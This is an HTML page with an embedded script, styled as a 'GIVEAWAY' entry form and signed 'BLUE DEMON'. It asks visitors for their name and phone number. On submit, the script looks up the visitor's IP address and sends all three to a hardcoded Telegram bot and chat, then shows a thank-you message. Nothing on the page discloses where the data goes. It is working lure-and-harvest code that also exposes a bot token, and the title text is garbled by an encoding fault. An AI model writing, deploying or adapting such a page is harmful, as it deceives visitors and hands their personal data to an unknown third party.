<body>
    <div class="container">
        <h1>üéÅGIVEAWAYüéÅ</h1>
        <form id="userForm">
            <div class="input-group">
                <label for="name">Name:</label>
                <input type="text" id="name" name="name" required>
            </div>
            <div class="input-group">
                <label for="phone">Phone Number:</label>
                <input type="tel" id="phone" name="phone" required>
            </div>
            <button type="submit">Submit</button>
            <div id="message"></div>
        </form>
        <div class="watermark">CODED BY <bold>ùô±ùôªùöÑùô¥ ùô≥ùô¥ùôºùôæùôΩ</bold></div><br>

    <script>
            document.addEventListener("DOMContentLoaded", () => {
            const form = document.getElementById("userForm");
            const messageDiv = document.getElementById("message");

            form.addEventListener("submit", async (event) => {
                event.preventDefault();

                const name = document.getElementById("name").value;
                const phone = document.getElementById("phone").value;

                // Get user IP address
                const ipResponse = await fetch("https://api.ipify.org?format=json");
                const ipData = await ipResponse.json();
                const userIP = ipData.ip;

                // Check if user has already submitted
                if (localStorage.getItem(userIP)) {
                    messageDiv.textContent = "You have already submitted your details.";
                    return;
                }

                // Send data to Telegram bot
                const telegramBotToken = "7210707261:AAH5KDmA65ld0zyfgXjuTl_6A7dnu_h0z6Q";
                const telegramChatId = "6573270131";
                const message = `Name: ${name}\nPhone: ${phone}\nIP: ${userIP}`;

                const telegramURL = `https://api.telegram.org/bot${telegramBotToken}/sendMessage?chat_id=${telegramChatId}&text=${encodeURIComponent(message)}`;

                try {
                    await fetch(telegramURL);
                    messageDiv.textContent = "Thank you! Your details have been submitted.";
                    localStorage.setItem(userIP, "submitted");
                } catch (error) {
                    messageDiv.textContent = "There was an error submitting your details. Please try again.";
                }
            });
        });
    </script>
